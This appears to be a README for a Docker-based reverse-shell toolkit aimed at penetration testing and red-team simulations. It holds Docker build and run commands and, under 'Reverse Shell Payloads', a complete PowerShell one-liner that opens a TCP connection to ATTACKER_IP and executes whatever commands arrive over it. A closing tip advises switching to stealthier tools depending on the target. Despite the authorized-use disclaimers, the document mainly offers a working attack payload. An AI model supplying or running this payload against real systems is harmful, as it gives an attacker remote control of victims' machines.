# 🐚 Docker Reverse Shell Toolkit

![Docker Logo](https://www.docker.com/wp-content/uploads/2022/03/horizontal-logo-monochromatic-white.png)

This project provides a **simple and modular Bash-based Reverse Shell Docker container** for penetration testing and red team simulations. It allows you to spawn reverse shells with ease and minimal setup. Output and logs are mounted to host for easy access.

---

## 📦 Docker Setup

### Build the Docker Container
```bash
docker build -t reverse-shell .
```

### Run the Container (Interactive Shell)
```bash
docker run -it --rm \
  -v $(pwd)/logs:/app/logs \
  reverse-shell
```

---

## 🔁 Reverse Shell Payloads

### 💻 PowerShell (on victim)
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

Replace `ATTACKER_IP` and `ATTACKER_PORT` accordingly.

---

## 📁 Volumes & Output

Logs and reverse shell outputs are stored in the `logs/` directory which is bind-mounted from the host:
```bash
-v $(pwd)/logs:/app/logs
```

---

## 🔐 Best Practices

- Always use this in authorized environments.
- Run in isolated VM or container networks for safety.
- Use encrypted channels if handling sensitive payloads (e.g., `socat`, `openssl`).

---

## 📥 Output Location
- All outputs go to `./logs` on the host machine.

---

## 🛠️ Example Interactive Prompt
When you run the container, you'll be prompted to enter the attacker's IP and Port:
```bash
Enter Attacker IP:
Enter Attacker Port:
```

This spawns a reverse shell using Bash.

---

### 🧠 Tip
You can also modify the reverse shell payload to use `socat`, `openssl`, or other more stealthy options depending on the target.

---

> ⚠️ This is for **authorized testing only**. Unauthorized use is illegal and unethical.
